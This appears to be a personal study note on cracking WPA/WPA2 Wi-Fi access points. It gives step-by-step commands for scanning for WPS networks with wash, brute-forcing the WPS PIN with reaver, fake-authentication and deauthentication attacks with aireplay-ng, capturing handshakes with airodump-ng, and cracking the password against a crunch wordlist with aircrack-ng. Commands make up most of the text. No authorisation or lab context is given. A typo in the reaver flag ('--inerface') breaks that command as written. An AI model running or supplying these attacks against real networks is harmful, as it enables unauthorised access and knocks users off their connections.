# Cracking the password of AP secured with WPA/WPA2

## WPS
- feature which can be enabled on WPA (for more security, don't enable)
- allows devices to connext without password
- authenication is done only by 8 digit pin
- Push Button Authentication (PBA)
  - Feature, where button needs to be pressed on router to make automatic connection

### Exploit WPS
- If PBA is activated, this won't work
- First enable monitoring mode as on 01_network_basics

```bash
wash --interface wlan0 # get all the neworks that use WPS (mon0 is in monitor mode)
```

- now bruteforce the network password wih `reaver`
    - -vvv is for showing as much information as possible
    - --no-associate is to not associate with target network, it is better to do it manualy

```bash
reaver --bssid B0:95:75:42:27:E3 --channel 44 --inerface wlan0 -vvv --no-associate
``` 

```bash
aireplay-ng --fakeauth 30 -a B0:95:75:42:27:E3 -h 5A:6E:23:9B:29:D8 wlan0 # asociae with nework (to not get ignored by network)
```

## Breaking WPA handshake
- Packets contain only data (no key or IV), therefor only handshake packets are usefull

### Capturing handshake in WPA communication
- Capture handshake:
  - to speedup the process of capuring hanshake, Deauthentication attack from 02_network_basics can be used.
```bash
airodump-ng --bssid B0:95:75:42:27:E3 --channel 44 --write wpa_hanshake wlan0 # capture all the packets on network, if handshake is capure, airodump-ng will display the information

aireplay-ng --deauth 4 -a B0:95:75:42:27:E3 -c 5A:6E:23:9B:29:D8 -D wlan0 # deauth attack
```

### Create wordlist using crunch
```bash
crunch [min] [max] [characters] -t [pattern] -o [Filename]
```

### Crack password from hanshake with wordlist
- aircrack-ng unpack the hanshake will be used to extract usefull information from the hanshake
- it will take password from word list and generate MIC (message inegrity code)
- then it will compare MIC in the handshake with generated MIC

```bash
aircrack-ng wpa_handshake-01.cap -w test.txt
```
- wpa_handshake-01.cap : hanshake file
- -w test.txt : our wordlist